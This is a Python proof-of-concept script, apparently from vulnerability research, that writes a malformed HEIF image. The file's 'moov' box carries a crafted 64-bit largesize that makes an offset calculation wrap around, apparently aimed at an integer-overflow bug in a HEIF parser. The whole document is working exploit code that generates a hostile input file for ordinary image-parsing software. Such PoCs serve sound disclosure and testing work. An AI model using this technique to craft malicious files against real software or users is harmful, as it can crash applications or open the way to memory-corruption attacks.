#!/usr/bin/env python3
"""bug18 PoC: moov box with crafted largesize that wraps when added to
moov_box_start."""

import sys, os, struct
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "common"))
import heif_box as hb


def main(out_path: str) -> None:
    ftyp = hb.ftyp(major=b"msf1", brands=(b"msf1", b"heic", b"mif1"))
    moov_box_start = len(ftyp)

    # Trivial moov body — not a valid moov, but parsing only needs to enter
    # the BitstreamRange ctor before failing.
    body = b"\x00" * 16

    target_wrapped_end = 4
    largesize = (1 << 64) - moov_box_start + target_wrapped_end
    print(f"[*] moov_box_start = {moov_box_start}")
    print(f"[*] largesize      = 0x{largesize:016x}")
    print(f"[*] wrapped end    = {(moov_box_start + largesize) & ((1<<64)-1)}")

    moov_with_overflow = (struct.pack(">I", 1) + b"moov" +
                          struct.pack(">Q", largesize) + body)

    out = ftyp + moov_with_overflow
    hb.write_file(out_path, out)


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "bug18_poc.heif")
